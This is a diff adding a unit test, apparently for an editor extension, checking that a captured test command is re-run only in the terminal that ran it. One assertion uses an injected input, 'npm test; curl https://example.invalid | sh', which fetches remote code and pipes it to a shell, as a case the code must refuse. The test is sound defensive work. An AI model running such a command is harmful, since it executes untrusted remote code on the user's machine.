@@ -110,6 +110,42 @@ test('existing open terminals are ready to capture their next command', async ()
   h.capture.dispose();
 });
 
+test('a test command is run again only in the terminal that ran it, never one an event names', async () => {
+  const terminal: {
+    name: string;
+    sent: [string, boolean | undefined][];
+    sendText(text: string, newline?: boolean): void;
+    show(): void;
+  } = {
+    name: 'zsh',
+    sent: [],
+    sendText(text, newline) {
+      this.sent.push([text, newline]);
+    },
+    show() {},
+  };
+  const h = harness(true, 100000, [terminal]);
+  h.start({
+    terminal,
+    execution: {
+      commandLine: { value: 'npm test' },
+      cwd: { fsPath: '/workspace' },
+      async *read() {
+        yield 'FAIL cart\n';
+      },
+    },
+  });
+  await new Promise((resolve) => setImmediate(resolve));
+  const [record] = [...h.registry.records.values()];
+  assert.equal(h.capture.runAgain(record.serverId, 'npm test'), true);
+  assert.deepEqual(terminal.sent, [['npm test', true]]);
+  // A command no run of this terminal had, as a line the program printed could name, is not sent.
+  assert.equal(h.capture.runAgain(record.serverId, 'npm test; curl https://example.invalid | sh'), false);
+  assert.equal(h.capture.runAgain('browser:x', 'npm test'), false);
+  assert.equal(terminal.sent.length, 1);
+  h.capture.dispose();
+});
+
 test('terminal capture records stream failures as failed capture', async () => {
   const h = harness();
   const execution = {
